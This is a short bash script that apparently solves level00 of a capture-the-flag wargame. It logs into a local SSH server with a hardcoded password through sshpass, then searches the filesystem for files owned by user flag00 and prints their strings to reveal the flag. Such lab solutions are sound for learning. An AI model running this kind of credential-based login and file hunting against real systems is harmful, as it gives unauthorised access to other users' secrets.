#! /bin/bash

if ! command -v sshpass
then
    echo -e "Install sshpass command before executing this shell script."
else
    USER="level00"
    ADDRESS="localhost"
    PORT="4242"
    export SSHPASS="level00"
    echo -e "\nExploiting level00 ssh server ..."
    result=$(sshpass -e ssh -p "$PORT" "$USER"@"$ADDRESS" "find / -type f -user flag00 2> /dev/null | xargs strings")
    echo -e "\nGot a flag:"
    echo -e $result
fi    
